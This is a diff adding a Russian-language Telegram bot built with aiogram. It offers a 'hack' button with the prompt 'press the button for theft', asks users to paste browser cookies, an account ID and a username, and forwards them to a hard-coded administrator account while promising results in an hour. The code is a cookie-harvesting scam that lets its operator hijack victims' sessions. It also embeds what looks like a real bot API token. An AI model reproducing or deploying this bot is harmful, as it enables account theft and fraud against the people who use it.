@@ -1,0 +1,109 @@
+import logging
+from pathlib import Path
+from aiogram import Bot, Dispatcher
+from aiogram.enums import ParseMode
+from aiogram.filters import Command
+from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
+from aiogram.utils.keyboard import ReplyKeyboardBuilder
+from aiogram.fsm.storage.memory import MemoryStorage
+from aiogram.fsm.state import State, StatesGroup
+from aiogram.fsm.context import FSMContext
+import asyncio
+
+# Создаем директорию для логов
+Path("logs").mkdir(exist_ok=True)
+
+# Настройка логирования
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler("logs/bot.log", encoding='utf-8'),
+        logging.StreamHandler()
+    ]
+)
+
+logger = logging.getLogger(__name__)
+
+# Конфигурация
+API_TOKEN = '8296775662:AAGJRgKkbVcGzO3GTBxkx9322Q_tvXuVdL0'  # Проверьте токен!
+ADMIN_ID = 636753617  # Без кавычек!
+
+logger.info(f"Запуск бота с токеном: {API_TOKEN[:10]}...")
+logger.info(f"Admin ID: {ADMIN_ID}")
+
+# Инициализация бота
+try:
+    bot = Bot(token=API_TOKEN)
+    storage = MemoryStorage()
+    dp = Dispatcher(storage=storage)
+    logger.info("Бот и диспетчер инициализированы")
+except Exception as e:
+    logger.error(f"Ошибка инициализации: {e}")
+    raise
+
+# Определение состояний
+class Form(StatesGroup):
+    waiting_for_cookies = State()
+    waiting_for_id = State()
+    waiting_for_username = State()
+
+@dp.message(Command("start"))
+async def cmd_start(message: Message):
+    logger.info(f"Пользователь {message.from_user.id} запустил бота")
+    builder = ReplyKeyboardBuilder()
+    builder.add(KeyboardButton(text="вzл0m"))
+    
+    await message.answer(
+        "Для кражи нажмите кнопку",
+        reply_markup=builder.as_markup(resize_keyboard=True)
+    )
+
+@dp.message(lambda message: message.text == "вzл0m")
+async def process_hack_start(message: Message, state: FSMContext):
+    await state.set_state(Form.waiting_for_cookies)
+    await message.answer("впишите куки")
+    logger.info(f"Пользователь {message.from_user.id} начал процесс")
+
+# ... остальные обработчики ...
+
+@dp.message(Form.waiting_for_username)
+async def process_username(message: Message, state: FSMContext):
+    await state.update_data(username=message.text)
+    data = await state.get_data()
+    
+    admin_message = (
+        f"📋 Новые данные получены:\n"
+        f"👤 От пользователя: {message.from_user.full_name} (ID: {message.from_user.id})\n"
+        f"🍪 Куки: {data.get('cookies')[:50]}...\n"  # Обрезаем для безопасности
+        f"🆔 ID: {data.get('id')}\n"
+        f"📛 Ник: {data.get('username')}\n"
+        f"⏰ Время: {message.date}"
+    )
+    
+    try:
+        await bot.send_message(ADMIN_ID, admin_message)
+        await message.answer("✅ Данные получены! Ожидайте примерно 1 час.")
+        logger.info(f"Данные отправлены админу от {message.from_user.id}")
+    except Exception as e:
+        error_msg = f"Ошибка отправки админу: {e}"
+        await message.answer("⚠️ Произошла ошибка при отправке данных.")
+        logger.error(error_msg)
+    
+    await state.clear()
+
+async def main():
+    logger.info("=== ЗАПУСК БОТА ===")
+    try:
+        await dp.start_polling(bot)
+    except Exception as e:
+        logger.error(f"Критическая ошибка: {e}")
+        raise
+
+if __name__ == '__main__':
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        logger.info("Бот остановлен")
+    except Exception as e:
+        logger.error(f"Ошибка запуска: {e}")
